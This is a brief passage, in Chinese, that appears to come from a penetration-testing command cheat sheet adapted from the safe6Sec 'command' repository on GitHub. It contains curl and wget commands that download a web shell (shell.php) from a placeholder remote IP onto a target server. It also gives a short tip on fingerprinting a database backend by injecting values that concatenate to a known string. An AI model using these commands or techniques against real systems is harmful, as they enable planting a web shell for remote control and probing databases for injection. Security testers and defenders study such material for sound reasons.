...
**在safe6大佬基础上修改的，原文链接：https://github.com/safe6Sec/command**

建议直接[Ctrl+F]查找，或者下载后用markdown工具打开，看左边的目录树中找。
...
```
curl -o shell.php http://xxx.xxx.xxx.xxx/shell.php
或者
wget http://xxx.xxx.xxx.xxx/shell.php -O s.php
```
...
如我们查询字符串`abcdef`得到了一个结果，可以在请求中提交特殊的值，测试用各种方法连接，以生成`abcdef`字符串。如过查询结果相同，就可以确定是哪一种数据库。
